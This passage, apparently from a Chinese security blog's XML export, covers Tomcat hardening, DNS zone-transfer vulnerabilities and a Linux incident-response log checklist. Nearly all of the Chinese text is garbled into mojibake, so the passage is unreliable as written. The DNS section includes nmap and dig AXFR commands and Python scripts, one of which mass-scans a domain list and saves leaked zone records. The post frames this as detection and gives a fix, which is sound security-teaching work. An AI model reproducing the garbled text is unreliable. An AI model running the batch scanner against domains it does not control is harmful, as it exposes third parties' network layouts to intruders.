.xml:æŒ‡å®štomcatå’Œåº”ç”¨çš„å¯åŠ¨è·¯å¾„ã€javaè¿è¡Œæ—¶è·¯å¾„ã€javaè¿è¡Œæ—¶å‚æ•°ã€è¿œç¨‹è°ƒè¯•å‚æ•°)web.xml(é…ç½®æ•´ä¸ªtomcatçš„jspå’Œservletå·¥ä½œä¸­çš„ä¸€äº›æƒ…å†µ:servletã€servlet-mappingã€session-configã€mime-mappingã€welcom-file-listã€ç›‘å¬å™¨ã€è¿‡æ»¤å™¨ã€error-page)ã€tomcat-users.xml(é…ç½®ç”¨æˆ·)æ–‡ä»¶è¿›è¡Œå¤‡ä»½ï¼Œç„¶åéƒ¨ç½²å®Œæ–°ç‰ˆæœ¬çš„tomcatä¹‹åï¼Œå°†è¿™äº›é…ç½®æ–‡ä»¶è¦†ç›–è¿‡å»å³å¯ï¼Œå†åœæ‰æ—§ç‰ˆæœ¬ï¼Œå¯åŠ¨æ–°ç‰ˆæœ¬å³å¯ã€‚ ï½ï½]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
        <tag>å®‰å…¨åŠ å›º</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNSåŸŸä¼ é€æ¼æ´]]></title>
    <url>%2F2017%2F03%2F16%2F8%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡å°†å¯¹dnsåŸŸä¼ é€æ¼æ´è¿›è¡Œåˆ†æä¸æ€»ç»“ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œæ¬¢è¿æŒ‡å‡ºã€‚è°¢è°¢! 0x00 åŸºç¡€DNS: ç½‘åŸŸåç§°ç³»ç»Ÿï¼ˆè‹±æ–‡ï¼šDomain Name Systemï¼Œç¼©å†™ï¼šDNSï¼‰æ˜¯äº’è”ç½‘çš„ä¸€é¡¹æœåŠ¡ã€‚å®ƒä½œä¸ºå°†åŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„çš„ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ï¼Œèƒ½å¤Ÿä½¿äººæ›´æ–¹ä¾¿åœ°è®¿é—®äº’è”ç½‘ã€‚DNSä½¿ç”¨TCPå’ŒUDPç«¯å£53ã€‚å½“å‰ï¼Œå¯¹äºæ¯ä¸€çº§åŸŸåé•¿åº¦çš„é™åˆ¶æ˜¯63ä¸ªå­—ç¬¦ï¼ŒåŸŸåæ€»é•¿åº¦åˆ™ä¸èƒ½è¶…è¿‡253ä¸ªå­—ç¬¦ã€‚12345678å¸¸ç”¨DNSè®°å½•ï¼šä¸»æœºè®°å½•(Aè®°å½•): Aè®°å½•æ˜¯ç”¨äºåç§°è§£æçš„é‡è¦è®°å½•ï¼Œå®ƒå°†ç‰¹å®šçš„ä¸»æœºåæ˜ å°„åˆ°å¯¹åº”ä¸»æœºçš„IPåœ°å€ä¸Šã€‚IPv6ä¸»æœºè®°å½•(AAAAè®°å½•): ä¸Aè®°å½•å¯¹åº”ï¼Œç”¨äºå°†ç‰¹å®šçš„ä¸»æœºåæ˜ å°„åˆ°ä¸€ä¸ªä¸»æœºçš„IPv6åœ°å€ã€‚ åˆ«å(CNAMEè®°å½•): CNAMEè®°å½•ç”¨äºå°†æŸä¸ªåˆ«åæŒ‡å‘åˆ°æŸä¸ªAè®°å½•ä¸Šï¼Œè¿™æ ·å°±ä¸éœ€è¦å†ä¸ºæŸä¸ªæ–°åå­—å¦å¤–åˆ›å»ºä¸€æ¡æ–°çš„Aè®°å½•ã€‚ç”µå­é‚®ä»¶äº¤æ¢è®°å½•ï¼ˆMXè®°å½•): è®°å½•ä¸€ä¸ªé‚®ä»¶åŸŸåå¯¹åº”çš„IPåœ°å€åŸŸåæœåŠ¡å™¨è®°å½• (NSè®°å½•): è®°å½•è¯¥åŸŸåç”±å“ªå°åŸŸåæœåŠ¡å™¨è§£æåå‘è®°å½•(PTRè®°å½•): ä¹Ÿå³ä»IPåœ°å€åˆ°åŸŸåçš„ä¸€æ¡è®°å½•TXTè®°å½•ï¼š è®°å½•åŸŸåçš„ç›¸å…³æ–‡æœ¬ä¿¡æ¯ DNSåŒºåŸŸä¼ é€: DNSæœåŠ¡å™¨åˆ†ä¸ºä¸»æœåŠ¡å™¨ã€å¤‡ä»½æœåŠ¡å™¨å’Œç¼“å­˜æœåŠ¡å™¨ã€‚è€ŒåŸŸä¼ é€æŒ‡çš„æ˜¯ä¸€å°å¤‡ç”¨æœåŠ¡å™¨ä½¿ç”¨æ¥è‡ªä¸»æœåŠ¡å™¨çš„æ•°æ®æ›´æ–°è‡ªå·±çš„åŸŸï¼ˆzoneï¼‰æ•°æ®åº“ã€‚è¿™ä¸ºè¿è¡Œä¸­çš„DNSæœåŠ¡æä¾›äº†ä¸€å®šçš„å†—ä½™åº¦ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ä¸»çš„åŸŸåæœåŠ¡å™¨å› æ„å¤–æ•…éšœå˜å¾—ä¸å¯ç”¨æ—¶å½±å“åˆ°æ•´ä¸ªåŸŸåçš„è§£æã€‚DNSåŸŸä¼ é€æ¼æ´: ä¸€èˆ¬DNSåŒºåŸŸä¼ é€æ“ä½œåªåœ¨ç½‘ç»œé‡ŒçœŸçš„æœ‰å¤‡ç”¨åŸŸåDNSæœåŠ¡å™¨æ—¶æ‰æœ‰å¿…è¦ç”¨åˆ°ï¼Œä½†è®¸å¤šDNSæœåŠ¡å™¨å´è¢«é”™è¯¯åœ°é…ç½®æˆåªè¦æœ‰clientå‘å‡ºè¯·æ±‚ï¼Œå°±ä¼šå‘å¯¹æ–¹æä¾›ä¸€ä¸ªzoneæ•°æ®åº“çš„è¯¦ç»†ä¿¡æ¯ï¼Œå³å…è®¸ä¸å—ä¿¡ä»»çš„å› ç‰¹ç½‘ç”¨æˆ·æ‰§è¡ŒDNSåŒºåŸŸä¼ é€æ“ä½œã€‚å±å®³: ä¾¿äºå¿«é€Ÿåˆ¤æ–­å‡ºæŸä¸ªç‰¹å®šåŒºåŸŸçš„æ‰€æœ‰ä¸»æœºï¼Œè·å–åŸŸä¿¡æ¯ï¼Œå¦‚ç½‘ç»œæ‹“æ‰‘ç»“æ„ã€æœåŠ¡å™¨ipåœ°å€ï¼Œä¸ºæ”»å‡»è€…çš„å…¥ä¾µæä¾›å¤§é‡æ•æ„Ÿä¿¡æ¯ã€‚nslookupnslookupæ˜¯ä¸€ä¸ªç½‘ç»œç®¡ç†å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºè®¸å¤šè®¡ç®—æœºæ“ä½œç³»ç»ŸæŸ¥è¯¢åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰ä»¥è·å–åŸŸåæˆ–IPåœ°å€æ˜ å°„æˆ–ä»»ä½•å…¶ä»–ç‰¹å®šçš„DNSè®°å½•ã€‚ä½¿ç”¨æ–¹å¼éäº¤äº’å¼ï¼šäº¤äº’å¼ï¼šdigdigæ˜¯Linuxé»˜è®¤è‡ªå¸¦çš„DNSæ‹¨æµ‹å·¥å…·ä¼ é€é—¨1234567891011121314151617181920212223242526root@sunu11ï¼š~# dig -h Usage: dig [@global-server] [domain] [q-type] [q-class] &#123;q-opt&#125; &#123;global-d-opt&#125; host [@local-server] &#123;local-d-opt&#125; [ host [@local-server] &#123;local-d-opt&#125; [...]] Where: domain is in the Domain Name System q-class is one of (in,hs,ch,...) [default: in] q-type is one of (a,any,mx,ns,soa,hinfo,axfr,txt,...) [default:a] (Use ixfr=version for type ixfr) q-opt is one of: -x dot-notation (shortcut for reverse lookups) -t type (specify query type) d-opt is of the form +keyword[=value], where keyword is: +[no]cmd (Control display of command line) +[no]comments (Control display of comment lines) +[no]question (Control display of question) +[no]answer (Control display of answer) +[no]authority (Control display of authority) +[no]additional (Control display of additional) +[no]stats (Control display of statistics) +[no]short (Disable everything except short form of answer) +[no]all (Set or clear all display flags) global d-opts and servers (before host name) affect all queries. local d-opts and servers (after host name) affect only that lookup. -h (print help and exit) -v (print version and exit) 0x01 å®æ–½ä¸€ã€æ”¶é›†dnsæœåŠ¡å™¨ä¿¡æ¯1ã€æ‰‹å·¥ä½¿ç”¨nslookupå‘½ä»¤ã€whoisæŸ¥è¯¢ç­‰æ‰‹æ®µè¿›è¡Œå¯¹æŸä¸ªåŸŸåçš„dnsæœåŠ¡å™¨ä¿¡æ¯çš„æ”¶é›†2ã€åˆ©ç”¨ç½‘ç»œç©ºé—´æœç´¢å¼•æ“æ”¶é›†åŸŸåæœåŠ¡å™¨ä¿¡æ¯ã€‚å¦‚ï¼ˆshadonã€zoomeyeã€fofaç­‰ï¼‰3ã€ä½¿ç”¨MASSCAN è¿›è¡Œç«¯å£æ‰«æåï¼Œè·å–å¼€æ”¾53å·ç«¯å£çš„dnsæœåŠ¡å™¨åœ°å€ï¼›è¯·å‚è€ƒä½¿ç”¨æŒ‡å—ã€‚4ã€ç½‘ä¸Šå­˜åœ¨ä¸€äº›dnsç¤¾å·¥è£¤ï¼Œä¹Ÿå¯ä»¥ä»ä¸­è·å–æ‰€éœ€è¦çš„dnsæœåŠ¡å™¨ä¿¡æ¯ã€‚ äºŒã€æ£€æµ‹DNSåŸŸä¼ é€æ¼æ´1ã€ä½¿ç”¨nmapæ‰«æä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š nmap â€“script dns-zone-transfer â€“script-args dns-zone-transfer.domain=xxx -p 53 -Pn dns.xxx å…¶ä¸­dns-zone-transfer.domainå‚æ•°ä¸ºæŒ‡å®šè¦æŸ¥è¯¢çš„åŸŸï¼›dns.xxx ä¸ºæŒ‡å®šçš„æŸ¥è¯¢åŸŸåæœåŠ¡å™¨ 2ã€ä½¿ç”¨digå‘½ä»¤å…¶ä¸­@æŒ‡å®šåŸŸåæœåŠ¡å™¨ï¼›axfr ä¸ºåŸŸä¼ é€æŒ‡ä»¤ï¼›xxx.edu.cnè¡¨ç¤ºè¦æŸ¥è¯¢çš„åŸŸå 3ã€nslookupå‘½ä»¤äº¤äº’å¼ï¼š12341) è¾“å…¥nslookupå‘½ä»¤è¿›å…¥äº¤äº’å¼shellç•Œé¢;2) server å‘½ä»¤å‚æ•°è®¾å®šæŸ¥è¯¢å°†è¦ä½¿ç”¨çš„DNSæœåŠ¡å™¨;é’ˆå¯¹æŸä¸ªåŸŸåå¯å…ˆè¾“å…¥åŸŸåè·å–dnsä¿¡æ¯ã€‚3) lså‘½ä»¤åˆ—å‡ºæŸä¸ªåŸŸä¸­çš„æ‰€æœ‰åŸŸå;å¦‚æœå¤ªé•¿ä¸é€‚åˆæŸ¥çœ‹å¯å®šå‘ä¿å­˜è‡³æ–‡ä»¶å¤¹ä¸­ã€‚4) exitå‘½ä»¤é€€å‡º éäº¤äº’å¼æ–¹æ³•ä¸ºäº†é¿å…å’Œnslookupäº¤æ¢ï¼Œå¯ä»¥ç¼–å†™ä¸€ä¸ªls.batã€‚echo ls %1 | nslookup â€“ %2é€šè¿‡æ‰§è¡Œls.bat xxx.edu.cn dns.xxx.edu.cnè¿›è¡Œæµ‹è¯•ã€‚ 0x02 æ‹“å±•å•ä¸ªæŸ¥è¯¢ï¼šã€ä½¿ç”¨dztester.py [domain]å³å¯ã€‘123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# coding:utf-8# Build by LandGrey 2016-12-03 import re import os import sys def dns_zone_tranfer_finder(domain): print &apos;[+] Nslookup %s&apos; % domain cmd_res = os.popen(&apos;nslookup -type=ns &apos; + domain).read() # fetch DNS Server List dns_servers = re.findall(&apos;nameserver = ([\w\.]+)&apos;, cmd_res) if len(dns_servers) == 0: print &apos;[+] No DNS Server Found!\n&apos; exit(0) for singledns in dns_servers: print &apos;[+] Using @%s&apos; % singledns cmd_res = os.popen(&apos;dig @%s axfr %s&apos; % (singledns, domain)).read() # print cmd_res if cmd_res.find(&apos;XFR size&apos;) &gt; 0: print &apos;[+] Vulnerable dns server found:&apos;, singledns print cmd_res else: print &apos;[+] No Vulnerable found&apos;def usage(): print &apos;[+] Usage: python DZT-tester.py [domain]\n&apos; if __name__ == &quot;__main__&quot;: if len(sys.argv) != 2: usage() elif &apos;-h&apos; in sys.argv[1]: usage() else: domain = sys.argv[1] print &apos;[+] Test %s&apos; % domain dns_zone_tranfer_finder(domain) print &apos;[+] Finished!&apos; æ‰¹é‡æŸ¥è¯¢è„šæœ¬ï¼šè„šæœ¬åŒä¸€ç›®å½•ä¸‹åº”æœ‰dns-zone-transferç›®å½•ï¼›dns-zone-transferç›®å½•ä¸‹æœ‰â€˜dnsâ€™å­ç›®å½•ï¼›è¦æ£€æµ‹çš„åŸŸååˆ—è¡¨å­˜æ”¾åœ¨dns-zone-transfer\domain.txtä¸­ï¼Œä¸€è¡Œä¸€ä¸ªã€‚ç»“æœå­˜å‚¨åœ¨dns-zone-transfer\dnsç›®å½•å’Œdns-zone-transfer\vulnerable_hosts.txtæ–‡ä»¶ä¸­ã€‚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# coding:utf-8import reimport osimport sysimport threadingdef dns_zone_tranfer_finder(): global c_index while True: lock.acquire() if c_index &gt;= len(DomainLists): lock.release() break domain = DomainLists[c_index].lstrip(&apos;www.&apos;) c_index += 1 lock.release() cmd_res = os.popen(&apos;nslookup -type=ns &apos; + domain).read() # fetch DNS Server List dns_servers = re.findall(&apos;nameserver = ([\w\.]+)&apos;, cmd_res) for server in dns_servers: if len(server) &lt; 5: server += domain cmd_res = os.popen(&apos;dig @%s axfr %s +short&apos; % (server, domain)).read() if cmd_res.find(&apos;XFR size&apos;) &gt; 0 \ and cmd_res.find(&apos;Transfer failed.&apos;) &lt; 0 \ and cmd_res.find(&apos;connection timed out&apos;) &lt; 0: lock.acquire() print &apos;*&apos; * 10 + &apos; Vulnerable dns server found:&apos;, server, &apos;*&apos; * 10 lock.release() with open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;vulnerable_hosts.txt&apos;), &apos;a&apos;) as f: f.write(&apos;%s %s\n&apos; % (server.ljust(30), domain)) with open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;dns&apos;, server + &apos;.txt&apos;), &apos;w&apos;) as f: f.write(cmd_res)if __name__ == &quot;__main__&quot;: currentdir = os.path.dirname(sys.argv[0]) target = open(os.path.join(currentdir, &apos;dns-zone-transfer&apos;, &apos;domain.txt&apos;)) DomainLists = [] for host in target.readlines(): DomainLists.append(host) print u&apos;é‡‡é›† %d ä¸ª...&apos; % len(DomainLists) threads = [] c_index = 0 lock = threading.Lock() for i in range(10): t = threading.Thread(target=dns_zone_tranfer_finder) t.start() threads.append(t) for t in threads: t.join() print &apos;All Done!&apos; æ¼æ´å­˜åœ¨æ ‡è¯†ä¸»è¦æ˜¯digå‘½ä»¤ç»“æœä¸­å‡ºç°ç‰¹å¾å­—ç¬¦ä¸²â€œXFR sizeâ€ 0x03 æ€»ç»“linuxç³»ç»Ÿå’Œwindowsç³»ç»Ÿéƒ½å¯ä»¥æ£€æµ‹å‡ºä½¿ç”¨çš„DNSæ˜¯å¦å­˜åœ¨åŸŸä¼ é€æ¼æ´ï¼Œå¦‚æœå­˜åœ¨è¯¥æ¼æ´ï¼Œé€šè¿‡æ‰§è¡Œå‘½ä»¤æˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°æ•´ä¸ªåŸŸä¸‹çš„åŸŸåè§£æä¿¡æ¯ã€‚è§£å†³æ–¹æ¡ˆï¼šåŒºåŸŸä¼ é€æ˜¯DNSå¸¸ç”¨çš„åŠŸèƒ½ï¼Œä¸¥æ ¼é™åˆ¶å…è®¸åŒºåŸŸä¼ é€çš„ä¸»æœºæ˜¯è§£å†³dnsåŸŸä¼ é€æ¼æ´çš„æœ‰æ•ˆæ‰‹æ®µã€‚æœ€åæ„Ÿè°¢å‰è¾ˆä»¬çš„æ–‡ç« ä¸è¾›å‹¤å¥‰çŒ®ï¼ æœ¬æ–‡ä½œæŠ€æœ¯ç ”ç©¶ä½¿ç”¨ï¼Œåˆ‡å‹¿ç”¨æœ¬æ–‡ä¸­çš„æ–¹æ³•è¿æ³•çŠ¯ç½ªï¼å‚è€ƒé“¾æ¥:æåŠ¼æ°DNSåŸŸä¼ é€æ¼æ´ç³»åˆ—åšå®¢ http://www.lijiejie.com/?s=DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E&amp;submit=SearchDNSåŸŸä¼ é€æ¼æ´çš„æ”¶é›†ã€æ£€æµ‹ä¸åˆ©ç”¨ http://blog.csdn.net/c465869935/article/details/53444117DNSåŸŸä¼ é€æ¼æ´åˆ©ç”¨ https://www.waitalone.cn/dns-domain-transfer-exploits.htmllijiejie/edu-dns-zone-transfer https://github.com/lijiejie/edu-dns-zone-transfer/blob/master/vulnerable_hosts.txt ï½ï½]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>nslookup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux åº”æ€¥å“åº”æ€»ç»“]]></title>
    <url>%2F2017%2F03%2F01%2F7%2F</url>
    <content type="text"><![CDATA[å‰è¨€ï¼ˆæ‰¯çŠŠå­ï¼‰ï¼šåšä¸ºä¸€ååœ¨å‰çº¿çš„ä¿¡æ¯å®‰å…¨ä»ä¸šäººå‘˜ï¼Œåº”æ€¥å“åº”æŠ€æœ¯æ˜¯å¿…ä¸å¯ç¼ºçš„ï¼Œåœ¨å¸¸è§çš„å®‰å…¨ä¿éšœæ¨¡å‹P2DRæ¨¡å‹ä¸­ï¼Œresponseï¼ˆå“åº”ï¼‰å æ®äº†å…¶ä¸­é‡è¦çš„ä¸€ä¸ªç¯èŠ‚ã€‚ä¸‹é¢æ˜¯æœ¬äººå­¦ä¹ åˆ°çš„åº”æ€¥å“åº”çš„ä¸€äº›çŸ¥è¯†ï¼ŒæŠ€å·§ã€‚ä¸€èˆ¬åº”æ€¥å“åº”æµç¨‹ï¼šæ•´ä¸ªæµç¨‹ä¸­ï¼Œå°¤ä¸ºé‡è¦çš„è«è¿‡äºè·å–å®‰å…¨äº‹ä»¶å‘ç”Ÿåçš„å¤„ç†é˜¶æ®µï¼Œä¸‹é¢é‡ç‚¹æ€»ç»“äº†ä¸€ä¸‹æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦è¢«å…¥ä¾µä»¥åŠæ˜¯å¦å­˜åœ¨åé—¨éœ€è¦åšçš„ä¸€äº›äº‹æƒ…ã€‚ æ£€æµ‹ç‚¹ï¼ˆé‡å¤´æˆï¼‰ï¼š1ã€‘æ—¥å¿—åˆ†æï¼šä¸‹é¢ä¸ºlinuxç³»ç»Ÿä¸­ä¸€äº›é‡è¦çš„æ—¥å¿—ä½ç½®å’Œç®€å•æ³¨é‡Šã€‚/var/log/messages â€” åŒ…æ‹¬æ•´ä½“ç³»ç»Ÿä¿¡æ¯ï¼Œå…¶ä¸­ä¹ŸåŒ…å«ç³»ç»Ÿå¯åŠ¨æœŸé—´çš„æ—¥å¿—ã€‚æ­¤å¤–ï¼Œmailï¼Œcronï¼Œdaemonï¼Œkernå’Œauthç­‰å†…å®¹ä¹Ÿè®°å½•åœ¨var/log/messagesæ—¥å¿—ä¸­ã€‚/var/log/dmesg â€” åŒ…å«å†…æ ¸ç¼“å†²ä¿¡æ¯ï¼ˆkernel ring bufferï¼‰ã€‚åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè®¸å¤šä¸ç¡¬ä»¶æœ‰å…³çš„ä¿¡æ¯ã€‚å¯ä»¥ç”¨dmesgæŸ¥çœ‹å®ƒä»¬ã€‚/var/log/auth.log â€” åŒ…å«ç³»ç»Ÿæˆæƒä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ç™»å½•å’Œä½¿ç”¨çš„æƒé™æœºåˆ¶ç­‰ã€‚/var/log/boot.log â€” åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶çš„æ—¥å¿—ã€‚/var/log/daemon.log â€” åŒ…å«å„ç§ç³»ç»Ÿåå°å®ˆæŠ¤è¿›ç¨‹æ—¥å¿—ä¿¡æ¯ã€‚/var/log/dpkg.log â€“ åŒ…æ‹¬å®‰è£…æˆ–dpkgå‘½ä»¤æ¸…é™¤è½¯ä»¶åŒ…çš„æ—¥å¿—ã€‚/var/log/kern.log â€“ åŒ…å«å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—ï¼Œæœ‰åŠ©äºåœ¨å®šåˆ¶å†…æ ¸æ—¶è§£å†³é—®é¢˜ã€‚/var/log/lastlog â€” è®°å½•æ‰€æœ‰ç”¨æˆ·çš„æœ€è¿‘ä¿¡æ¯ã€‚è¿™ä¸æ˜¯ä¸€ä¸ªASCIIæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦ç”¨lastlogå‘½ä»¤æŸ¥çœ‹å†…å®¹ï¼ˆ*å…³äºlastlogå‘½ä»¤è§æ³¨1ï¼‰ã€‚/var/log/maillog /var/log/mail.log â€” åŒ…å«æ¥ç€ç³»ç»Ÿè¿è¡Œç”µå­é‚®ä»¶æœåŠ¡å™¨çš„æ—¥å¿—ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œsendmailæ—¥å¿—ä¿¡æ¯å°±å…¨éƒ¨é€åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚/var/log/user.log â€” è®°å½•æ‰€æœ‰ç­‰çº§ç”¨æˆ·ä¿¡æ¯çš„æ—¥å¿—ã€‚/var/log/Xorg.x.log â€” æ¥è‡ªXçš„æ—¥å¿—ä¿¡æ¯ã€‚/var/log/alternatives.log â€“ æ›´æ–°æ›¿ä»£ä¿¡æ¯éƒ½è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚/var/log/btmp â€“ è®°å½•æ‰€æœ‰å¤±è´¥ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨lastå‘½ä»¤å¯ä»¥æŸ¥çœ‹btmpæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œâ€last -f /var/log/btmp | moreâ€œã€‚/var/log/cups â€” æ¶‰åŠæ‰€æœ‰æ‰“å°ä¿¡æ¯çš„æ—¥å¿—ã€‚/var/log/anaconda.log â€” åœ¨å®‰è£…Linuxæ—¶ï¼Œæ‰€æœ‰å®‰è£…ä¿¡æ¯éƒ½å‚¨å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚/var/log/yum.log â€” åŒ…å«ä½¿ç”¨yumå®‰è£…çš„è½¯ä»¶åŒ…ä¿¡æ¯ã€‚/var/log/cron â€” æ¯å½“cronè¿›ç¨‹å¼€å§‹ä¸€ä¸ªå·¥ä½œæ—¶ï¼Œå°±ä¼šå°†ç›¸å…³ä¿¡æ¯è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚/var/log/secure â€” åŒ…å«éªŒè¯å’Œæˆæƒæ–¹é¢ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œsshdä¼šå°†æ‰€æœ‰ä¿¡æ¯è®°å½•ï¼ˆå…¶ä¸­åŒ…æ‹¬å¤±è´¥ç™»å½•ï¼‰åœ¨è¿™é‡Œã€‚/var/log/wtmpæˆ–/var/log/utmp â€” åŒ…å«ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨wtmpå¯ä»¥æ‰¾å‡ºè°æ­£åœ¨ç™»é™†è¿›å…¥ç³»ç»Ÿï¼Œè°ä½¿ç”¨å‘½ä»¤æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶æˆ–ä¿¡æ¯ç­‰ã€‚/var/log/faillog â€“ åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚é™¤äº†ä¸Šè¿°Logæ–‡ä»¶ä»¥å¤–ï¼Œ /var/logè¿˜åŸºäºç³»ç»Ÿçš„å…·ä½“åº”ç”¨åŒ…å«ä»¥ä¸‹ä¸€äº›å­ç›®å½•ã€‚/var/log/httpd/æˆ–/var/log/apache2 â€” åŒ…å«æœåŠ¡å™¨access_logå’Œerror_logä¿¡æ¯ã€‚/var/log/lighttpd/ â€” åŒ…å«light HTTPDçš„access_logå’Œerror_logã€‚/var/log/mail/ â€“ è¿™ä¸ªå­ç›®å½•åŒ…å«é‚®ä»¶æœåŠ¡å™¨çš„é¢å¤–æ—¥å¿—ã€‚/var/log/prelink/ â€” åŒ…å«.soæ–‡ä»¶è¢«prelinkä¿®æ”¹çš„ä¿¡æ¯ã€‚/var/log/audit/ â€” åŒ…å«è¢« Linux audit daemonå‚¨å­˜çš„ä¿¡æ¯ã€‚/var/log/samba/ â€“ åŒ…å«ç”±sambaå­˜å‚¨çš„ä¿¡æ¯ã€‚/var/log/sa/ â€” åŒ…å«æ¯æ—¥ç”±sysstatè½¯ä»¶åŒ…æ”¶é›†çš„saræ–‡ä»¶ã€‚/var/log/sssd/ â€“ ç”¨äºå®ˆæŠ¤è¿›ç¨‹å®‰å…¨æœåŠ¡ã€‚~/.bash_history - è‡³å…³é‡è¦çš„æ—¥å¿—ï¼Œå¾€å¾€é»‘å®¢ä¼šä½¿ç”¨history -cæ¸…ç†ç›¸å…³çš„æ—¥å¿—ï¼Œä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ é™¤ .bash_profileæ–‡ä»¶ä¸­çš„è®°å½•ã€‚/var/log/sudo.log - æŸ¥çœ‹SUDOæ—¥å¿—åœ¨ç›¸åº”çš„æ—¶é—´æ®µæ˜¯å¦å‡ºç°å¯ç–‘çš„ç”¨æˆ·è¿›è¡Œè¿‡SUæ“ä½œå¦å¤–å¦‚æœè¯¥å°ä¸»æœºæ˜¯åšä¸ºä¸€å°webæœåŠ¡å™¨ï¼Œè¿˜å¯ä»¥å®¡è®¡ä¸€ä¸‹å…¶webæœåŠ¡å™¨çš„æ—¥å¿—ï¼Œæ¥è§¦æ¯”è¾ƒå¤šçš„ä¸ºapacheã€tomcatã€nagixä¸ºä¸»ã€‚æ— è®ºå“ªç§webæœåŠ¡å™¨ï¼Œaccess_log å’Œ error_logæ—¥å¿—éƒ½æ˜¯å€¼å¾—ä¸€çœ‹çš„ ã€‚ä¸€èˆ¬findå‘½ä»¤å¯ä»¥æå®šã€‚ 2ã€‘ç”¨æˆ·åŠç”¨æˆ·æ–‡ä»¶åˆ†æ1ã€ä½¿ç”¨ls -l /etc/passwdæŸ¥çœ‹passwdæ–‡ä»¶çš„æƒé™â€”/etc/passwdé»˜è®¤æƒé™ä¸º644å³ï¼ˆrw-râ€“râ€“)ï¼Œå…¶æœ€å°æƒé™ä¸º444(râ€“râ€“râ€“)ï¼Œé¦–å…ˆåº”å¯¹è¯¥æ–‡ä»¶æƒé™è¿›è¡Œæ£€æŸ¥ï¼Œä»¥ç¡®è®¤é…ç½®æ˜¯å¦æ­£ç¡®ï¼›ç„¶åä½¿ç”¨ls -l /etc/shadow æ£€æŸ¥shadowæ–‡ä»¶çš„æƒé™é…ç½®ï¼Œé»˜è®¤æƒé™ä¸º600(rwâ€”â€”-)ï¼Œæœ€å°æƒé™ä¸º400(râ€”â€”â€“)ã€‚2ã€ä½¿ç”¨cat /etc/passwd æŸ¥çœ‹passwdæ–‡ä»¶å†…å®¹ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨å¯ç–‘è´¦å·ã€‚3ã€ä½¿ç”¨awk -F : &#39;$3==0{print $1}&#39; /etc/passwd æŸ¥çœ‹æ˜¯å¦å­˜åœ¨UIDä¸º0çš„ç”¨æˆ·ï¼Œè¯¥å‘½ä»¤è¡¨ç¤ºæ‰“å°UID=çš„ç”¨æˆ·ä¿¡æ¯ã€‚ ä½¿ç”¨awk &#39;/$1|$6/{print $1}&#39; /etc/shadow æŸ¥è¯¢è¿œç¨‹ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ æ­¤å¤„å­˜åœ¨é”™è¯¯ã€‚æ„Ÿè°¢ç½‘å‹28**1279æé†’ã€‚ç»è¿‡åˆ†æä¸Šè¿°å‘½ä»¤æœ‰è¯¯ï¼Œä½¿ç”¨ï¼šawk &#39;/\$1|\$6/{print $1}&#39; /etc/shadow å¯æŸ¥è¯¢è¿œç¨‹ç™»å½•çš„ç”¨æˆ·åã€‚ ç¦ç”¨æˆ–è€…åˆ é™¤å¤šä½™ä»¥åŠå¯ç–‘è´¦å·ï¼šusermod -L userï¼ˆç¦ç”¨ï¼‰ï¼Œ/etc/shadowç¬¬äºŒæ ä¸ºï¼å¼€å¤´ userdel useråˆ é™¤userç”¨æˆ· userdel -r userå°†åˆ é™¤userç”¨æˆ·ï¼Œ å°†/homeç›®å½•ä¸‹çš„userç›®å½•ä¸€å¹¶åˆ é™¤passwdæ–‡ä»¶æ ¼å¼ï¼ˆæ— å¯†ç åªå…è®¸æœ¬æœºç™»é™†ï¼‰1root:x:0:0:root:/root:/bin/bash ç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šç»„IDï¼šç”¨æˆ·è¯´æ˜ï¼šå®¶ç›®å½•ï¼šç™»é™†ä¹‹åshellshadowæ–‡ä»¶æ 